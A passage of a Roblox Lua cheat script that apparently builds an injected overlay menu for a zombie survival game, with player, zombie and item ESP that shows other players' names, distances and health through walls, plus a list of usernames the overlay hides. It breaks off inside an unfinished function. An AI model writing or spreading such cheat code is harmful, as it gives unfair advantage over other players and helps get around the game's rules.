	FrameIS.Position = UDim2.new(0.5, 0, 1.60000002, 0)
	FrameIS.Size = UDim2.new(1, 0, 0.800000012, 0)
	FrameIS.SizeConstraint = Enum.SizeConstraint.RelativeXX
	FrameIS.ClipsDescendants = true
	FrameIS.Visible = false
	
	Results.Name = "Results"
	Results.Parent = FrameIS
	Results.AnchorPoint = Vector2.new(0.5, 1)
	Results.BackgroundColor3 = Color3.new(1, 1, 1)
	Results.BackgroundTransparency = 1
	Results.BorderSizePixel = 0
	Results.Position = UDim2.new(0.5, 0, 1, -5)
	Results.Size = UDim2.new(0.949999988, 0, 0.779999971, 0)
	Results.CanvasSize = UDim2.new(0, 0, 7, 0)
	Results.ScrollBarThickness = 3
	
	UIListLayout_3.Parent = Results
	UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_3.Padding = UDim.new(0, 5)
	
	NoResults.Name = "NoResults"
	NoResults.Parent = Results
	NoResults.AnchorPoint = Vector2.new(0.5, 0)
	NoResults.BackgroundColor3 = Color3.new(1, 1, 1)
	NoResults.BackgroundTransparency = 1
	NoResults.Position = UDim2.new(0.5, 0, 0, 0)
	NoResults.Size = UDim2.new(1, 0, 0.100000001, 0)
	NoResults.SizeConstraint = Enum.SizeConstraint.RelativeXX
	NoResults.Visible = false
	NoResults.Font = Enum.Font.SourceSansBold
	NoResults.Text = "NO RESULTS"
	NoResults.TextColor3 = Color3.new(1, 1, 1)
	NoResults.TextScaled = true
	NoResults.TextSize = 14
	NoResults.TextTransparency = 0.60000002384186
	NoResults.TextWrapped = true
	
	SearchBox.Name = "SearchBox"
	SearchBox.Parent = FrameIS
	SearchBox.BackgroundColor3 = Color3.new(0, 0, 0)
	SearchBox.BackgroundTransparency = 0.80000001192093
	SearchBox.BorderSizePixel = 0
	SearchBox.Position = UDim2.new(0.0250000004, 0, 0.0500000007, 0)
	SearchBox.Size = UDim2.new(0.800000012, 0, 0.0799999982, 0)
	SearchBox.SizeConstraint = Enum.SizeConstraint.RelativeXX
	SearchBox.Font = Enum.Font.SourceSansItalic
	SearchBox.Text = "[ENTRY]"
	SearchBox.TextColor3 = Color3.new(1, 1, 1)
	SearchBox.TextScaled = true
	SearchBox.TextSize = 14
	SearchBox.TextWrapped = true
	
	Clear.Name = "Clear"
	Clear.Parent = FrameIS
	Clear.AnchorPoint = Vector2.new(1, 0)
	Clear.BackgroundColor3 = Color3.new(0.741176, 0.266667, 0.266667)
	Clear.BorderSizePixel = 0
	Clear.Position = UDim2.new(0.975000024, 0, 0.0500000007, 0)
	Clear.Size = UDim2.new(0.119999997, 0, 0.0799999982, 0)
	Clear.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Clear.Font = Enum.Font.SourceSansBold
	Clear.Text = "CLEAR"
	Clear.TextColor3 = Color3.new(1, 1, 1)
	Clear.TextScaled = true
	Clear.TextSize = 14
	Clear.TextWrapped = true
	
	TogglePESP.Name = "TogglePESP"
	TogglePESP.Parent = Main
	TogglePESP.AnchorPoint = Vector2.new(0.5, 0)
	TogglePESP.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	TogglePESP.BackgroundTransparency = 1
	TogglePESP.BorderSizePixel = 0
	TogglePESP.Position = UDim2.new(0.5, 0, 0.075000003, 0)
	TogglePESP.Size = UDim2.new(0.600000024, 0, 0.0799999982, 0)
	TogglePESP.SizeConstraint = Enum.SizeConstraint.RelativeXX
	TogglePESP.Font = Enum.Font.SourceSans
	TogglePESP.Text = "PLAYER ESP"
	TogglePESP.TextColor3 = Color3.new(1,1,1)
	TogglePESP.TextScaled = true
	TogglePESP.TextSize = 14
	TogglePESP.TextWrapped = true
	
	ToggleZESP.Name = "ToggleZESP"
	ToggleZESP.Parent = Main
	ToggleZESP.AnchorPoint = Vector2.new(0.5, 1)
	ToggleZESP.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	ToggleZESP.BackgroundTransparency = 1
	ToggleZESP.BorderSizePixel = 0
	ToggleZESP.Position = UDim2.new(0.5, 0, 0.925000012, 0)
	ToggleZESP.Size = UDim2.new(0.600000024, 0, 0.0799999982, 0)
	ToggleZESP.SizeConstraint = Enum.SizeConstraint.RelativeXX
	ToggleZESP.Font = Enum.Font.SourceSans
	ToggleZESP.Text = "ZOMBIE ESP"
	ToggleZESP.TextColor3 = Color3.new(1, 1, 1)
	ToggleZESP.TextScaled = true
	ToggleZESP.TextSize = 14
	ToggleZESP.TextWrapped = true
	
	ToggleSettings.Name = "ToggleSettings"
	ToggleSettings.Parent = Main
	ToggleSettings.AnchorPoint = Vector2.new(1, 1)
	ToggleSettings.BackgroundColor3 = Color3.new(1, 1, 1)
	ToggleSettings.BackgroundTransparency = 1
	ToggleSettings.Position = UDim2.new(1, -3, 1, -3)
	ToggleSettings.Size = UDim2.new(0.100000001, 0, 0.100000001, 0)
	ToggleSettings.SizeConstraint = Enum.SizeConstraint.RelativeXX
	ToggleSettings.Image = "rbxassetid://484211948"
	ToggleSettings.ImageTransparency = 0.40000000596046
	
	TogglePlayerList.Name = "TogglePlayerList"
	TogglePlayerList.Parent = Main
	TogglePlayerList.BackgroundColor3 = Color3.new(0, 0, 0)
	TogglePlayerList.BackgroundTransparency = 0.40000000596046
	TogglePlayerList.BorderSizePixel = 0
	TogglePlayerList.Position = UDim2.new(0, 0, 1.10000002, 0)
	TogglePlayerList.Size = UDim2.new(0.49000001, 0, 0.0799999982, 0)
	TogglePlayerList.SizeConstraint = Enum.SizeConstraint.RelativeXX
	TogglePlayerList.Font = Enum.Font.SourceSans
	TogglePlayerList.Text = "PLAYER LIST"
	TogglePlayerList.TextColor3 = Color3.new(1,1,1)
	TogglePlayerList.TextScaled = true
	TogglePlayerList.TextSize = 14
	TogglePlayerList.TextWrapped = true
	
	UITextSizeConstraint_2.Parent = TogglePlayerList
	UITextSizeConstraint_2.MaxTextSize = 20
	
	ToggleItemESP.Name = "ToggleItemESP"
	ToggleItemESP.Parent = Main
	ToggleItemESP.AnchorPoint = Vector2.new(1, 0)
	ToggleItemESP.BackgroundColor3 = Color3.new(0, 0, 0)
	ToggleItemESP.BackgroundTransparency = 0.40000000596046
	ToggleItemESP.BorderSizePixel = 0
	ToggleItemESP.Position = UDim2.new(1, 0, 1.10000002, 0)
	ToggleItemESP.Size = UDim2.new(0.49000001, 0, 0.0799999982, 0)
	ToggleItemESP.SizeConstraint = Enum.SizeConstraint.RelativeXX
	ToggleItemESP.Font = Enum.Font.SourceSans
	ToggleItemESP.Text = "ITEM TRACKER"
	ToggleItemESP.TextColor3 = Color3.new(1, 1, 1)
	ToggleItemESP.TextScaled = true
	ToggleItemESP.TextSize = 14
	ToggleItemESP.TextWrapped = true
	
	UITextSizeConstraint_3.Parent = ToggleItemESP
	UITextSizeConstraint_3.MaxTextSize = 20
	
	HitBox.Name = "HitBox"
	HitBox.Parent = Main
	HitBox.AnchorPoint = Vector2.new(0.5, 0.5)
	HitBox.BackgroundColor3 = Color3.new(1, 1, 1)
	HitBox.BackgroundTransparency = 1
	HitBox.Position = UDim2.new(0.5, 0, 0.5, 0)
	HitBox.Size = UDim2.new(1.20000005, 0, 2.4000001, 0)
	HitBox.Image = ""
	HitBox.ImageTransparency = 1
	
	OutTop.Name = "OutTop"
	OutTop.Parent = HitBox
	OutTop.AnchorPoint = Vector2.new(0.5, 1)
	OutTop.BackgroundColor3 = Color3.new(1, 1, 1)
	OutTop.BackgroundTransparency = 1
	OutTop.Position = UDim2.new(0.5, 0, 0, 0)
	OutTop.Size = UDim2.new(10, 0, 3, 0)
	OutTop.Image = ""
	OutTop.ImageTransparency = 1
	
	OutBot.Name = "OutBot"
	OutBot.Parent = HitBox
	OutBot.AnchorPoint = Vector2.new(0.5, 0)
	OutBot.BackgroundColor3 = Color3.new(1, 1, 1)
	OutBot.BackgroundTransparency = 1
	OutBot.Position = UDim2.new(0.5, 0, 3, 0)
	OutBot.Size = UDim2.new(10, 0, 10, 0)
	OutBot.Image = ""
	OutBot.ImageTransparency = 1
	
	OutLeft.Name = "OutLeft"
	OutLeft.Parent = HitBox
	OutLeft.AnchorPoint = Vector2.new(1, 0)
	OutLeft.BackgroundColor3 = Color3.new(1, 1, 1)
	OutLeft.BackgroundTransparency = 1
	OutLeft.Size = UDim2.new(3, 0, 3, 0)
	OutLeft.Image = ""
	OutLeft.ImageTransparency = 1
	
	OutRight.Name = "OutRight"
	OutRight.Parent = HitBox
	OutRight.BackgroundColor3 = Color3.new(1, 1, 1)
	OutRight.BackgroundTransparency = 1
	OutRight.Position = UDim2.new(1, 0, 0, 0)
	OutRight.Size = UDim2.new(3, 0, 3, 0)
	OutRight.Image = ""
	OutRight.ImageTransparency = 1
		
	
	local plrs = game.Players:GetPlayers()
	local playerlist = PlayerList
	local input = game:GetService("UserInputService")
	local me = game.Players.LocalPlayer
	local mouse = me:GetMouse()
	local UIstorage = game.CoreGui
	local maxdistance = 9999
	local maxzeddet = 100
	local maxplrdet = 250
	local refreshkey = Enum.KeyCode.E
	local hidekey = Enum.KeyCode.Backquote
	local keychange = false
	local TweenService = game:GetService("TweenService")
	
	local PlayerESPEnabled = false
	local ZombieESPEnabled = false
	
	local currentframe = nil
	
	
	--[[local isdragging = false
	DragPart.InputBegan:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			isdragging = true
		end
	end)
	
	DragPart.InputEnded:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			isdragging = false
		end
	end)
	
	local HandleCustomDrag = coroutine.wrap(function()
		local timer = 0.1
		while wait(timer) do
			if isdragging then
				timer = 0.0000000001
				DragPart.Position = UDim2.new(0,mouse.X - (DragPart.AbsoluteSize.X / 2),0,mouse.Y - (DragPart.AbsoluteSize.Y / 2))
			else
				timer = 0.1
			end
		end
	end)
	
	HandleCustomDrag()]]
	
	
	local associations = {
		ToggleItemESP = FrameIS,
		TogglePlayerList = FramePL,
		ToggleSettings = FrameSet,
		
		[FrameSet] = ToggleSettings,
		[FrameIS] = ToggleItemESP,
		[FramePL] = TogglePlayerList,
		}
	
	
	function OpenMenu(element)
		--print("ye",element.Name)
		if currentframe and currentframe ~= element then
			currentframe.Visible = false
			if currentframe == FrameSet then
				associations[FrameSet].ImageColor3 = Color3.fromRGB(255, 255, 255)
				associations[FrameSet].ImageTransparency = 0.4
				local tw = coroutine.wrap(function()
					local tweeninfo = TweenInfo.new(0.1)
					local tween = TweenService:Create(associations[FrameSet],tweeninfo,{Rotation = 0})
					tween:Play()
				end)
				tw()
			else
				associations[currentframe].Text = string.sub(associations[currentframe].Text,2,string.len(associations[currentframe].Text) - 1)
				associations[currentframe].TextColor3 = Color3.fromRGB(255, 255, 255)
				associations[currentframe]:TweenSize(UDim2.new(0.49,0,0.08,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.1,true)
			end
			currentframe = element
			currentframe.Size = UDim2.new(1,0,0,0)
			currentframe.Visible = true
			if currentframe == FrameSet then
				associations[FrameSet].ImageColor3 = Color3.fromRGB(255, 194, 39)
				associations[FrameSet].ImageTransparency = 0.2
				local tw = coroutine.wrap(function()
					local tweeninfo = TweenInfo.new(0.1)
					local tween = TweenService:Create(associations[FrameSet],tweeninfo,{Rotation = 45})
					tween:Play()
				end)
				tw()
			else
				associations[currentframe].Text = "["..associations[currentframe].Text.."]"
				associations[currentframe].TextColor3 = Color3.fromRGB(255, 194, 39)
				associations[currentframe]:TweenSize(UDim2.new(0.49,0,0.104,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.1,true)
			end
			currentframe:TweenSize(UDim2.new(1,0,0.8,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.1,true)
		elseif not currentframe then
			currentframe = element
			currentframe.Size = UDim2.new(1,0,0,0)
			currentframe.Visible = true
			if currentframe == FrameSet then
				associations[FrameSet].ImageColor3 = Color3.fromRGB(255, 194, 39)
				associations[FrameSet].ImageTransparency = 0.2
				local tw = coroutine.wrap(function()
					local tweeninfo = TweenInfo.new(0.1)
					local tween = TweenService:Create(associations[FrameSet],tweeninfo,{Rotation = 45})
					tween:Play()
				end)
				tw()
			else
				--print(associations[currentframe].Name)
				associations[currentframe].Text = "["..associations[currentframe].Text.."]"
				associations[currentframe].TextColor3 = Color3.fromRGB(255, 194, 39)
				associations[currentframe]:TweenSize(UDim2.new(0.49,0,0.104,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.1,true)
			end
			currentframe:TweenSize(UDim2.new(1,0,0.8,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.1,true)	
		end
	end
	
	
	ToggleItemESP.MouseButton1Click:connect(function()
		OpenMenu(associations.ToggleItemESP)
	end)
	
	TogglePlayerList.MouseButton1Click:connect(function()
		OpenMenu(associations.TogglePlayerList)
	end)
	
	ToggleSettings.MouseButton1Click:connect(function()
		OpenMenu(associations.ToggleSettings)
	end)
	
	TogglePESP.MouseButton1Click:connect(function()
		PlayerESPEnabled = not PlayerESPEnabled
		if PlayerESPEnabled then
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "ESP";
				Text = "Player ESP Enabled.";
				Duration = 6
	        })
			TogglePESP.Text = "["..TogglePESP.Text.."]"
			TogglePESP.TextColor3 = Color3.fromRGB(255, 194, 39)
		else
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "ESP";
				Text = "Player ESP Disabled.";
				Duration = 6
	        })
			TogglePESP.Text = string.sub(TogglePESP.Text,2,string.len(TogglePESP.Text) - 1)
			TogglePESP.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
	
	ToggleZESP.MouseButton1Click:connect(function()
		ZombieESPEnabled = not ZombieESPEnabled
		if ZombieESPEnabled then
			ToggleZESP.Text = "["..ToggleZESP.Text.."]"
			ToggleZESP.TextColor3 = Color3.fromRGB(255, 194, 39)
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "ESP";
				Text = "Zombie ESP Enabled.";
				Duration = 6
	        })
		else
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "ESP";
				Text = "Zombie ESP Disabled.";
				Duration = 6
	        })
			ToggleZESP.Text = string.sub(ToggleZESP.Text,2,string.len(ToggleZESP.Text) - 1)
			ToggleZESP.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
	
	--HITBOX HANDLER
	local currenthitboxhover = nil
	
	HitBox.MouseMoved:connect(function()
		if (not currenthitboxhover or currenthitboxhover ~= "In") and currentframe then
			currenthitboxhover = "In"
			currentframe:TweenSize(UDim2.new(1,0,0.8,0),Enum.EasingDirection.In,Enum.EasingStyle.Quad,0.1,true)
			--print(currenthitboxhover)
		end
	end)
	
	for i,v in pairs(HitBox:GetChildren()) do
		if v:IsA("ImageLabel") then
			v.MouseMoved:connect(function()
				if (not currenthitboxhover or currenthitboxhover ~= "Out") and currentframe then
					currenthitboxhover = "Out"
					currentframe:TweenSize(UDim2.new(1,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.1,true)
					--print(currenthitboxhover)
				end
			end)
		end
	end
	
	
	
	--
	
	
	local shadowlist = {
		["MarcusMTyrus"] = {"NoShow"},
		["gismanuk"] = {"NoShow"},
		["IouismatIeIIi06"] = {"NoShow"},
		["BlOHUNTER209"] = {"NoShow"},
	
	}
	
	if shadowlist[me.Name] then
		shadowlist = {}
	end
	
	
	local colors = {
		On = Color3.fromRGB(255, 194, 39),
		Off = Color3.fromRGB(255, 255, 255),
		
		Imp = Color3.fromRGB(--[[255, 179, 26]]15,215,255),
		NotImp = Color3.fromRGB(203, 203, 203),
	}
		
	local info = {}
	
	local tracks = {}
	
	
	local cam = Instance.new("Camera")
	local input = game:GetService("UserInputService")
	local rotateplayercam = 180
		
		--CLEAR TRACKS
		Clear.MouseButton1Click:connect(function()
			for pos,v in pairs(tracks) do
				if v.Tracked == true then
					Rem_Track(v.Name,pos)
				end
			end
		end)
		
		local enabled = true
		function update_keybind(func)
			if keychange == true and enabled then
				
				if func == "Hide" then
					KeySetH.Text = "?"
				elseif func == "Refresh" then
					KeySet.Text = "?"
				end
				input.InputBegan:connect(function(key)
					if keychange == true and enabled then
						enabled = false
						if key.KeyCode ~= Enum.KeyCode.Unknown then
							if func == "Hide" then
								hidekey = key.KeyCode
								--local str = tostring(key.KeyCode)
								KeySetH.Text = string.char(key.KeyCode.Value):upper()--string.sub(str, 14, string.len(str))
								wait(.6)
								keychange = false
								enabled = true	
							elseif func == "Refresh" then
								refreshkey = key.KeyCode
								--local str = tostring(key.KeyCode)
								KeySet.Text = string.char(key.KeyCode.Value):upper() --string.sub(str, 14, string.len(str))
								
								wait(.6)
								keychange = false
								enabled = true		
							end
							
						end
						
					end
					
				end)
			end
		end
		
		KeySet_ESP.MouseButton1Click:connect(function()
			keychange = true
			update_keybind("Refresh")
		end)
		
		KeySet_Hide.MouseButton1Click:connect(function()
			keychange = true
			update_keybind("Hide")
		end)
		
		function add_playerlist(name)
			if not PlayerList:FindFirstChild(name) then
				local PLAYERNAMEHERE = Instance.new("Frame")
				local PlayerName = Instance.new("TextButton")
				local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
				local EnabledStatus = Instance.new("TextButton")
				local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
				local Important = Instance.new("TextButton")
				local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
				local BeamStatus = Instance.new("TextButton")
				local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
				PLAYERNAMEHERE.Name = "PLAYERNAMEHERE"
				PLAYERNAMEHERE.Parent = Templates
				PLAYERNAMEHERE.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
				PLAYERNAMEHERE.BackgroundTransparency = 1
				PLAYERNAMEHERE.BorderSizePixel = 0
				PLAYERNAMEHERE.Size = UDim2.new(1, -10, 0, 30)
				PLAYERNAMEHERE.Visible = true
				
				PlayerName.Name = "PlayerName"
				PlayerName.Parent = PLAYERNAMEHERE
				PlayerName.AnchorPoint = Vector2.new(1, 0)
				PlayerName.BackgroundColor3 = Color3.new(0.796079, 0.796079, 0.796079)
				PlayerName.BackgroundTransparency = 0.80000001192093
				PlayerName.BorderSizePixel = 0
				PlayerName.Position = UDim2.new(1, 0, 0, 0)
				PlayerName.Size = UDim2.new(0.75999999, 0, 1, 0)
				PlayerName.Font = Enum.Font.SourceSansBold
				PlayerName.Text = "PLAYER NAME HERE"
				PlayerName.TextColor3 = Color3.new(1, 1, 1)
				PlayerName.TextScaled = true
				PlayerName.TextSize = 14
				PlayerName.TextWrapped = true
				
				UITextSizeConstraint.Parent = PlayerName
				UITextSizeConstraint.MaxTextSize = 20
				
				EnabledStatus.Name = "EnabledStatus"
				EnabledStatus.Parent = PLAYERNAMEHERE
				EnabledStatus.AnchorPoint = Vector2.new(0, 0.5)
				EnabledStatus.BackgroundColor3 = Color3.new(1, 1, 1)
				EnabledStatus.BackgroundTransparency = 0.5
				EnabledStatus.BorderSizePixel = 0
				EnabledStatus.Position = UDim2.new(0, 0, 0.5, 0)
				EnabledStatus.Size = UDim2.new(0.5, 0, 0.800000012, 0)
				EnabledStatus.SizeConstraint = Enum.SizeConstraint.RelativeYY
				EnabledStatus.Font = Enum.Font.SourceSansBold
				EnabledStatus.Text = " "
				EnabledStatus.TextColor3 = Color3.new(0, 0, 0)
				EnabledStatus.TextScaled = true
				EnabledStatus.TextSize = 14
				EnabledStatus.TextWrapped = true
				
				UITextSizeConstraint_2.Parent = EnabledStatus
				UITextSizeConstraint_2.MaxTextSize = 15
				
				Important.Name = "Important"
				Important.Parent = PLAYERNAMEHERE
				Important.AnchorPoint = Vector2.new(0, 0.5)
				Important.BackgroundColor3 = Color3.new(1, 1, 1)
				Important.BackgroundTransparency = 0.5
				Important.BorderSizePixel = 0
				Important.Position = UDim2.new(0.159999996, 0, 0.5, 0)
				Important.Size = UDim2.new(0.5, 0, 0.800000012, 0)
				Important.SizeConstraint = Enum.SizeConstraint.RelativeYY
				Important.Font = Enum.Font.SourceSansBold
				Important.Text = " "
				Important.TextColor3 = Color3.new(0, 0, 0)
				Important.TextSize = 14
				
				UITextSizeConstraint_3.Parent = Important
				UITextSizeConstraint_3.MaxTextSize = 15
				
				BeamStatus.Name = "BeamStatus"
				BeamStatus.Parent = PLAYERNAMEHERE
				BeamStatus.AnchorPoint = Vector2.new(0, 0.5)
				BeamStatus.BackgroundColor3 = Color3.new(1, 1, 1)
				BeamStatus.BackgroundTransparency = 0.5
				BeamStatus.BorderSizePixel = 0
				BeamStatus.Position = UDim2.new(0.0799999982, 0, 0.5, 0)
				BeamStatus.Size = UDim2.new(0.5, 0, 0.800000012, 0)
				BeamStatus.SizeConstraint = Enum.SizeConstraint.RelativeYY
				BeamStatus.Font = Enum.Font.SourceSansBold
				BeamStatus.Text = " "
				BeamStatus.TextColor3 = Color3.new(0, 0, 0)
				BeamStatus.TextSize = 14
				
				UITextSizeConstraint_4.Parent = BeamStatus
				UITextSizeConstraint_4.MaxTextSize = 15
		
				PLAYERNAMEHERE.Name = name
				PLAYERNAMEHERE.PlayerName.Text = name
				
				
				if not info[name] then
					info[name] = {
					ESPEnabled = true,
					BeamEnabled = false,
					Important = false,
					Primary = "None",
					Secondary = "None",
					BackPack = "None",
					Vest = "None",
					Hat = "None",
					Accessory = "None",
					}
				end
				PLAYERNAMEHERE.Parent = playerlist
				update_info(name,"EBI")
				
				PLAYERNAMEHERE.BeamStatus.MouseButton1Click:connect(function()
					if info[name] then
						info[name].BeamEnabled = not info[name].BeamEnabled
						update_info(name,"B")
					end
				end)
				
				PLAYERNAMEHERE.EnabledStatus.MouseButton1Click:connect(function()
					if info[name] then
						info[name].ESPEnabled = not info[name].ESPEnabled
						update_info(name,"E")
					end
				end)
				
				PLAYERNAMEHERE.Important.MouseButton1Click:connect(function()
					if info[name] then
						info[name].Important = not info[name].Important
						update_info(name,"I")
					end
				end)
			end
		end
	
		game.Players.PlayerRemoving:connect(function(player)
			if player and info[player.Name] then
				info[player.Name] = nil
			end
		end)
		
		SetDist.Changed:connect(function()
			if tonumber(SetDist.Text) ~= nil and string.len(tostring(SetDist.Text)) > 1 then
				maxdistance = tonumber(SetDist.Text)
			end
		end)
		
		SetDistPlrDet.Changed:connect(function()
			if tonumber(SetDistPlrDet.Text) ~= nil and string.len(tostring(SetDistPlrDet.Text)) > 1 then
				maxplrdet = tonumber(SetDistPlrDet.Text)
			end
		end)
		
		SetDistZedDet.Changed:connect(function()
			if tonumber(SetDistZedDet.Text) ~= nil and string.len(tostring(SetDistZedDet.Text)) > 1 then
				maxzeddet = tonumber(SetDistZedDet.Text)
			end
		end)
		
		
		function rem_playerlist(name)
			if PlayerList:FindFirstChild(name) and UIstorage:FindFirstChild("tracker_"..name) then
				PlayerList:FindFirstChild(name):Destroy()
				UIstorage:FindFirstChild("tracker_"..name):Destroy()
			end
		end
		
		--UPDATE LENGTH OF ScrFrm
		function update_list_len(element,size)
			if element and element:IsA("ScrollingFrame") and element:FindFirstChild("UIListLayout") then
				local amt = #element:GetChildren()
				local UILL = element.UIListLayout
				
				local c1 = amt * size
				local c2 = amt * UILL.Padding.Offset
				local c3 = c1 + c2
				
				element.CanvasSize = UDim2.new(0,0,0,c3+UILL.Padding.Offset)
				
			end
		end
		
		----------
		--CREATE ESP UI
		function create_ESP_UI(name,to_parent,uitype,pos)
			if name and to_parent and name ~= game.Players.LocalPlayer.Name and not shadowlist[name] then
				if uitype == "Player" then
					local bb = Instance.new('BillboardGui',UIstorage)
					bb.Adornee = to_parent
					bb.ExtentsOffset = Vector3.new(0,2,0)
					bb.AlwaysOnTop = true
					bb.Size = UDim2.new(0,5,0,5)
					bb.StudsOffset = Vector3.new(0,1,0)
					bb.Name = 'tracker_'..name
					local frame = Instance.new('Frame',bb)
					frame.ZIndex = 10
					frame.BackgroundTransparency = 0.3
					frame.Size = UDim2.new(1,0,1,0)
					frame.AnchorPoint = Vector2.new(0.5,1)
					frame.Position = UDim2.new(0.5,0,1,4)
					local txtlbl = Instance.new('TextLabel',bb)
					txtlbl.ZIndex = 10
					txtlbl.BackgroundTransparency = 1
					txtlbl.Position = UDim2.new(0,0,0,-35)
					txtlbl.Size = UDim2.new(1,0,10,0)
					txtlbl.Font = 'ArialBold'
					txtlbl.FontSize = 'Size12'
					txtlbl.Text = name.."(".. math.ceil(game.Players.LocalPlayer:DistanceFromCharacter(to_parent.Position))..")"
					txtlbl.TextStrokeTransparency = 0.5
					txtlbl.TextTransparency = 0.3
					--HEALTH
					local hframe = Instance.new('Frame',bb)
					hframe.Name = "Health"
					hframe.ZIndex = 10
					hframe.BackgroundTransparency = 0.3
					hframe.Size = UDim2.new(0,0,0,2)
					hframe.Position = UDim2.new(0.5,0,0,0)
					hframe.AnchorPoint = Vector2.new(0.5,0)
					hframe.BorderSizePixel = 0
					hframe.BackgroundColor3 = Color3.fromRGB(0,255,0)
					--BONUS HEALTH
					local bframe = Instance.new('Frame',bb)
					bframe.Name = "Bonus"
					bframe.ZIndex = 10
					bframe.BackgroundTransparency = 0.3
					bframe.Size = UDim2.new(0,0,0,2)
					bframe.Position = UDim2.new(0.5,0,0,0)
					bframe.AnchorPoint = Vector2.new(0.5,0)
					bframe.BorderSizePixel = 0
					bframe.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
					if to_parent.Parent:FindFirstChild("Stats") and to_parent.Parent.Stats:FindFirstChild("Health") and to_parent.Parent.Stats.Health:FindFirstChild("Bonus") then
						local chamt = to_parent.Parent.Stats.Health.Value
						local new_chamt = 20 * (chamt/100)
						hframe.Size = UDim2.new(new_chamt,0,0,2)
						
						to_parent.Parent.Stats.Health.Changed:connect(function()
							local amt = to_parent.Parent.Stats.Health.Value
							local new_amt = 20 * (amt/100)
							hframe.Size = UDim2.new(new_amt,0,0,2)
						end)
						local cbamt = to_parent.Parent.Stats.Health.Bonus.Value
						local new_cbamt = 20 * (cbamt/100)
						bframe.Size = UDim2.new(new_cbamt,0,0,2)
						to_parent.Parent.Stats.Health.Bonus.Changed:connect(function()
							local amt = to_parent.Parent.Stats.Health.Bonus.Value
							local new_amt = 20 * (amt/100)
							bframe.Size = UDim2.new(new_amt,0,0,2)
						end)
					end
					if info[name] and info[name].Important == true then
						txtlbl.TextColor3 = colors.Imp
						frame.BackgroundColor3 = colors.Imp
					else
						txtlbl.TextColor3 = Color3.new(0,1,0)
						frame.BackgroundColor3 = Color3.new(0,1,0)
					end
				elseif uitype == "Item" then
					local bb = Instance.new('BillboardGui',UIstorage)
					bb.Adornee = to_parent
					bb.ExtentsOffset = Vector3.new(0,2,0)
					bb.AlwaysOnTop = true
					bb.Size = UDim2.new(0,5,0,5)
					bb.StudsOffset = Vector3.new(0,1,0)
					bb.Name = 'Tracker_'..name.."_".. tostring(pos)
					local frame = Instance.new('Frame',bb)
					frame.ZIndex = 10
					frame.BackgroundTransparency = 0.3
					frame.Size = UDim2.new(1,0,1,0)
					local txtlbl = Instance.new('TextLabel',bb)
					txtlbl.ZIndex = 10
					txtlbl.BackgroundTransparency = 1
					txtlbl.Position = UDim2.new(0,0,0,-35)
					txtlbl.Size = UDim2.new(1,0,10,0)
					txtlbl.Font = 'ArialBold'
					txtlbl.FontSize = 'Size12'
					txtlbl.Text = name.."(".. math.ceil(game.Players.LocalPlayer:DistanceFromCharacter(to_parent.Position))..")"
					txtlbl.TextStrokeTransparency = 0.5
					txtlbl.TextTransparency = 0.3
					txtlbl.TextColor3 = Color3.fromRGB(255, 255, 255)
					frame.BackgroundColor3 = Color3.fromRGB(37, 237, 255)
				
				end
			end
		end
		
		--CHECK FOR PLAYERS THAT DIED
		
		game.Workspace.Characters.ChildRemoved:Connect(function(char)
			player_died(char.Name)
		end)
			
		--REFRESH GUIs
		
		local paused = false
		function KeyPressed1(input,gameProcessed)
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == refreshkey and gameProcessed == false and keychange == false then
					---------------------------------
					paused = true
					for i,v in pairs(UIstorage:GetChildren()) do
						if string.find(v.Name,"tracker") then
							v:Destroy()
						end
					
					end
					wait(0.3)
		
					for i,char in pairs(game.Workspace.Characters:GetChildren()) do
						if char.Name ~= me and shadowlist[char.Name] == nil and UIstorage:FindFirstChild("tracker_"..char.Name) == nil and char:FindFirstChild("Head") then
					   		create_ESP_UI(char.Name,char.Head,"Player")
						end
					end
					paused = false
					-------------------------------
				elseif input.KeyCode == hidekey and gameProcessed == false and keychange == false then
					Main.Visible = not Main.Visible
				end
			end	
		end
		
		
		
		game:GetService("UserInputService").InputBegan:connect(KeyPressed1)
		
		
		--PLAYER JOINED
		game.Workspace.Characters.ChildAdded:connect(function(schar)
			--if game.Players:FindFirstChild(schar.Name) then
				for i,char in pairs(game.Workspace.Characters:GetChildren()) do
					if char.Name ~= game.Players.LocalPlayer.Name and shadowlist[char.Name] == nil and UIstorage:FindFirstChild("tracker_"..char.Name) == nil and char:FindFirstChild("Head") then
						create_ESP_UI(char.Name,char.Head,"Player")
						add_playerlist(char.Name)
					end
				end
			--end
		end)
		
		game.Workspace.Characters.ChildRemoved:connect(function(schar)
			if shadowlist[schar.Name] == nil then
				rem_playerlist(schar.Name)
			end
		end)
		
		
		--CLEAR PLAYER INFO
		
		function player_died(name)
			if info[name] then
				info[name].Primary = "None"
				info[name].Secondary = "None"
				info[name].BackPack = "None"
				info[name].Vest = "None"
				info[name].Hat = "None"
				info[name].Accessory = "None"
			end
		end
		
		
		
		--ESP
		function Show_ESP(player)
		end
		
		function Rem_ESP(player)
		end
		
		--BEAM
		
		function Show_BEAM(player)
